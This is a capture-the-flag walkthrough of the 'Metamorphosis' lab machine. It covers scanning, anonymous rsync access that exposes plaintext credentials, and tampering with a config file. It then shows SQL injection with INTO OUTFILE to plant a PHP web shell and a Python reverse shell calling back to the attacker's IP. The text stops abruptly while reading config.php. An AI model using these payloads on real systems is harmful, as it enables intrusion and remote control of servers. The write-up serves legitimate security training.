# Metamorphosis — Writeup

## Overview
### Metamorphosis — Writeup
### Metamorphosis — Writeup
----
Part of Incognito CTF
----
![](https://0cirius0.github.io/writeup/assets/img/metamorphosis/main.jpg)
Start Machine
Part of [Incognito 2.0 CTF](https://ctftime.org/event/1321)
Like my work, Follow on twitter to be updated and know more about my work! ([@0cirius0](https://twitter.com/0cirius0))
Answer the questions below

## Enumeration
```text
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.84.192 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.84.192:22
Open 10.10.84.192:80
Open 10.10.84.192:139
Open 10.10.84.192:445
Open 10.10.84.192:873
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.07s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.84.192 [5 ports]
Discovered open port 445/tcp on 10.10.84.192
Discovered open port 80/tcp on 10.10.84.192
Discovered open port 139/tcp on 10.10.84.192
Discovered open port 22/tcp on 10.10.84.192
Discovered open port 873/tcp on 10.10.84.192
Completed Connect Scan (5 total ports)
Initiating Service scan
Scanning 5 services on 10.10.84.192
Completed Service scan (5 services on 1 host)
NSE: Script scanning 10.10.84.192.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.84.192
Host is up, received user-set (0.22s latency).

PORT    STATE SERVICE     REASON  VERSION
22/tcp  open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f70f0a1850780710f232d1603040d4be (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDjT/lRIkM7TFdpO6bwrOH8B0fB1kVslwfc/jdO+WtRiic1J8hDXzLatrXeBpzFqWveVmMI84dUhmidyBTk+jIksonSxB6IrLxCw+clRTQOUGXYw6iu3DiVZ6Xr/BlnxscgGuFMEvYd7E2ADyyVY/HDvpPMIv7SrDxfd+UNXf9yELZbsgY9CEqBuqT/3Ka4lt6ecslpcfMbkhZdiTgYnZ9EMrcmJlKcEXMq/tliZt5VuV7nxOEqKi1LfmgeIcl48Mok1sPCro+QsVfR5BvJPilLIfC35HoaBF1tyIdbzvZLfj/iCB/EhhtMqLZoPB2l/fg7RQ9soXK1rYgRbM0x7sv7
|   256 5c0037dfb2ba4cf23c466ea3e9449037 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGW8YbCvrlt/1rWQ4pObroj9o9vLbiGbYb/xxAjX/HoTxGUGYF/lYBCbZtmv8Fnkfs5Lg6K5MIHjjd/jpzNDQOg=
|   256 febf53f1d05a7c30dbacc83c796447c8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKxJeDTFMHsXaGHyZ8lSFpxm8VpawK1rvSDY0lbifD8e
80/tcp  open  http        syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache2 Ubuntu Default Page: It works
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
873/tcp open  rsync       syn-ack (protocol version 31)
Service Info: Host: INCOGNITO; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: incognito
|   NetBIOS computer name: INCOGNITO\x00
|   Domain name: \x00
|   FQDN: incognito
|_  System time: 2023-07-23T16:14:56+00:00
|_clock-skew: mean: 2s, deviation: 2s, median: 1s
| smb2-time: 
|   date: 2023-07-23T16:14:55
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 45920/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 34665/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 64711/udp): CLEAN (Failed to receive data)
|   Check 4 (port 7721/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| nbstat: NetBIOS name: INCOGNITO, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| Names:
|   INCOGNITO<00>        Flags: <unique><active>
|   INCOGNITO<03>        Flags: <unique><active>
|   INCOGNITO<20>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   0000000000000000000000000000000000
|   0000000000000000000000000000000000
|_  0000000000000000000000000000
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.70 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ smbclient -L 10.10.84.192 
Password for [WORKGROUP\witty]:

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (incognito server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            INCOGNITO

┌──(witty㉿kali)-[~/Downloads]
└─$ smbmap -u anonymous -H 10.10.84.192
[+] Guest session   	IP: 10.10.84.192:445	Name: 10.10.84.192                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	IPC$                                              	NO ACCESS	IPC Service (incognito server (Samba, Ubuntu))

┌──(root㉿kali)-[/home/witty/Downloads]
└─# dirsearch -u http://10.10.84.192 -i200,301,302,401

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /root/.dirsearch/reports/10.10.84.192/_23-07-23_12-19-14.txt

Error Log: /root/.dirsearch/logs/errors-23-07-23_12-19-14.log

Target: http://10.10.84.192/

[12:19:14] Starting: 
[12:20:07] 301 -  312B  - /admin  ->  http://10.10.84.192/admin/
[12:20:09] 200 -  132B  - /admin/
[12:20:09] 200 -  132B  - /admin/?/login
[12:20:10] 200 -    0B  - /admin/config.php
[12:20:11] 200 -  132B  - /admin/index.php
[12:21:09] 200 -   11KB - /index.php
[12:21:10] 200 -   11KB - /index.php/login/

Task Completed

like vulnnet internal

┌──(root㉿kali)-[/home/witty/Downloads]
└─# rsync --list-only rsync://10.10.84.192 
Conf           	All Confs

┌──(root㉿kali)-[/home/witty/Downloads]
└─# rsync --list-only rsync://10.10.84.192/Conf
drwxrwxrwx          4,096  .
-rw-r--r--          4,620  access.conf
-rw-r--r--          1,341  bluezone.ini
-rw-r--r--          2,969  debconf.conf
-rw-r--r--            332  ldap.conf
-rw-r--r--         94,404  lvm.conf
-rw-r--r--          9,005  mysql.ini
-rw-r--r--         70,207  php.ini
-rw-r--r--            320  ports.conf
-rw-r--r--            589  resolv.conf
-rw-r--r--             29  screen-cleanup.conf
-rw-r--r--          9,542  smb.conf
-rw-rw-r--             72  webapp.ini

or

┌──(root㉿kali)-[/home/witty/Downloads]
└─# rsync -av rsync://10.10.84.192/Conf
receiving incremental file list
drwxrwxrwx          4,096  .
-rw-r--r--          4,620  access.conf
-rw-r--r--          1,341  bluezone.ini
-rw-r--r--          2,969  debconf.conf
-rw-r--r--            332  ldap.conf
-rw-r--r--         94,404  lvm.conf
-rw-r--r--          9,005  mysql.ini
-rw-r--r--         70,207  php.ini
-rw-r--r--            320  ports.conf
-rw-r--r--            589  resolv.conf
-rw-r--r--             29  screen-cleanup.conf
-rw-r--r--          9,542  smb.conf
-rw-rw-r--             72  webapp.ini

sent 20 bytes  received 379 bytes  114.00 bytes/sec
total size is 193,430  speedup is 484.79

The `rsync` command is a powerful file synchronization and transfer tool used in Unix-based systems. It is used to efficiently copy and synchronize files between different locations, whether they are local directories or remote systems accessible via SSH or rsync protocol.

- `-a`: This option stands for "archive mode" and is used to preserve the file's metadata during the synchronization process, including permissions, timestamps, and symbolic links.
- `-v`: The "verbose" option, which displays detailed output during the synchronization process, showing which files are being transferred.

In summary, the main difference is that `rsync` without the `--list-only` option performs the actual synchronization, while `rsync --list-only` shows the preview of the changes without actually transferring any files.

┌──(root㉿kali)-[/home/witty/Downloads]
└─# rsync -av --list-only rsync://10.10.84.192/Conf 
receiving incremental file list
drwxrwxrwx          4,096  .
-rw-r--r--          4,620  access.conf
-rw-r--r--          1,341  bluezone.ini
-rw-r--r--          2,969  debconf.conf
-rw-r--r--            332  ldap.conf
-rw-r--r--         94,404  lvm.conf
-rw-r--r--          9,005  mysql.ini
-rw-r--r--         70,207  php.ini
-rw-r--r--            320  ports.conf
-rw-r--r--            589  resolv.conf
-rw-r--r--             29  screen-cleanup.conf
-rw-r--r--          9,542  smb.conf
-rw-rw-r--             72  webapp.ini

sent 20 bytes  received 379 bytes  266.00 bytes/sec
total size is 193,430  speedup is 484.79

now copy files

                                                                                              
┌──(root㉿kali)-[/home/witty/Downloads]
└─# rsync -aPv rsync://10.10.84.192/Conf ./myConf
receiving incremental file list
created directory ./myConf
./
access.conf
          4,620 100%    4.41MB/s    0:00:00 (xfr#1, to-chk=11/13)
bluezone.ini
          1,341 100%  654.79kB/s    0:00:00 (xfr#2, to-chk=10/13)
debconf.conf
          2,969 100%  966.47kB/s    0:00:00 (xfr#3, to-chk=9/13)
ldap.conf
            332 100%  108.07kB/s    0:00:00 (xfr#4, to-chk=8/13)
lvm.conf
         94,404 100%   77.54kB/s    0:00:01 (xfr#5, to-chk=7/13)
mysql.ini
          9,005 100%   94.56kB/s    0:00:00 (xfr#6, to-chk=6/13)
php.ini
         70,207 100%   88.13kB/s    0:00:00 (xfr#7, to-chk=5/13)
ports.conf
            320 100%    0.40kB/s    0:00:00 (xfr#8, to-chk=4/13)
resolv.conf
            589 100%    0.74kB/s    0:00:00 (xfr#9, to-chk=3/13)
screen-cleanup.conf
             29 100%    0.04kB/s    0:00:00 (xfr#10, to-chk=2/13)
smb.conf
          9,542 100%   10.87kB/s    0:00:00 (xfr#11, to-chk=1/13)
webapp.ini
             72 100%    0.08kB/s    0:00:00 (xfr#12, to-chk=0/13)

sent 255 bytes  received 194,360 bytes  43,247.78 bytes/sec
total size is 193,430  speedup is 0.99

┌──(root㉿kali)-[/home/witty/Downloads]
└─# cd ./myConf 
                                                                                              
┌──(root㉿kali)-[/home/witty/Downloads/myConf]
└─# ls
access.conf   debconf.conf  lvm.conf   php.ini     resolv.conf          smb.conf
bluezone.ini  ldap.conf     mysql.ini  ports.conf  screen-cleanup.conf  webapp.ini

┌──(root㉿kali)-[/home/witty/Downloads/myConf]
└─# cat webapp.ini 
[Web_App]
env = prod
user = tom
password = theCat

[Details]
Local = No

view-source:http://10.10.84.192/admin/

<html> <head><h1>403 Forbidden</h1></head><!-- Make sure admin functionality can only be used in development environment. --></html>

so changing to dev instead of prod (also we have creds)

here we have the ‘**webapp.ini**’ file which is used by the server in which we can specify the environment to ‘dev’ and sync the webapp.ini file with the server

`webapp.ini` is a configuration file typically used in web applications. It contains settings and parameters that define how the web application behaves, interacts with databases, handles user sessions, and other important configurations.

The contents of `webapp.ini` can vary depending on the specific web application framework being used. Common settings found in a `webapp.ini` file might include:

1. Database connection information: Such as the database type (MySQL, PostgreSQL, SQLite, etc.), database name, username, password, and host.
    
2. Security settings: Including options related to authentication, authorization, and session management.
    
3. Debugging and logging configurations: To control the level of debugging information displayed and logged for troubleshooting purposes.
    
4. File paths and directories: To specify where static files (CSS, JavaScript) and templates are stored.
    
5. Server-specific configurations: Such as the server port, server host, and SSL settings.
    
6. Caching and performance settings: For optimizing the web application's performance.
    
7. Custom application-specific settings: These can vary widely depending on the specific requirements of the web application.
    

Each web application framework may have its own naming convention for the configuration file, but `webapp.ini` is a common name used in some frameworks like Flask and Pyramid.

It's important to keep `webapp.ini` secure, as it can contain sensitive information like database credentials or API keys that should not be exposed to the public. Properly configuring and protecting this file is essential for the security and proper functioning of the web application.

┌──(root㉿kali)-[/home/witty/Downloads/myConf]
└─# cat webapp.ini
[Web_App]
env = dev
user = tom
password = theCat

[Details]
Local = No

After Changing the value you need to upload the new file to the shared folder (Conf)

┌──(root㉿kali)-[/home/witty/Downloads/myConf]
└─# rsync -aPv webapp.ini rsync://10.10.84.192/Conf/webapp.ini
sending incremental file list
webapp.ini
             71 100%    0.00kB/s    0:00:00 (xfr#1, to-chk=0/1)

sent 185 bytes  received 41 bytes  150.67 bytes/sec
total size is 71  speedup is 0.31

now check admin portal

after entering tom we get
Username Password
tom thecat

sqli using burp

username=tom" union select version(),2,3-- -

Username Password<br>tom thecat<br />Username Password<br>2 3<br />

username=tom" union select 1,version(),database()-- -

Username Password<br>tom thecat<br />Username Password<br>5.7.34-0ubuntu0.18.04.1 db<br />

cols 2,3 writable

┌──(witty㉿kali)-[~/Downloads]
└─$ python                                                       
Python 3.11.2 (main, Feb 12 2023, 00:48:52) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> print (("<? system($_GET['cmd’]); ?>").encode('utf-8').hex())
3c3f2073797374656d28245f4745545b27636d64e280995d293b203f3e

username=witty" UNION ALL SELECT NULL,0x3c3f7068702073797374656d28245f4745545b27636d64275d293b3f3e,NULL INTO OUTFILE "/var/www/html/revshell.php"-- -

HTTP/1.0 500 Internal Server Error

Date: Sun, 23 Jul 2023 16:59:56 GMT

Server: Apache/2.4.29 (Ubuntu)

Content-Length: 0

Connection: close

Content-Type: text/html; charset=UTF-8

but ...

http://10.10.84.192/revshell.php?cmd=id

\N uid=33(www-data) gid=33(www-data) groups=33(www-data) \N 

http://10.10.84.192/revshell.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.8.19.103%22,1337));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22/bin/bash%22)%27

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337                                     
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.84.192] 59744
www-data@incognito:/var/www/html$ python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
</bash')" || /usr/bin/script -qc /bin/bash /dev/null
www-data@incognito:/var/www/html$ ls
ls
admin  inde.html  index.php  revshell.php
www-data@incognito:/var/www/html$ cat revshell.php
cat revshell.php
\N	<?php system($_GET['cmd']);?>	\N

www-data@incognito:/var/www/html$ cat index.php
cat index.php
<?php

$doc = new DOMDocument();
$doc -> loadHTMLFile("./inde.html");
echo $doc->saveHTML();
echo "1";
?>

www-data@incognito:/var/www/html/admin$ cat config.php
cat config.php
<?php
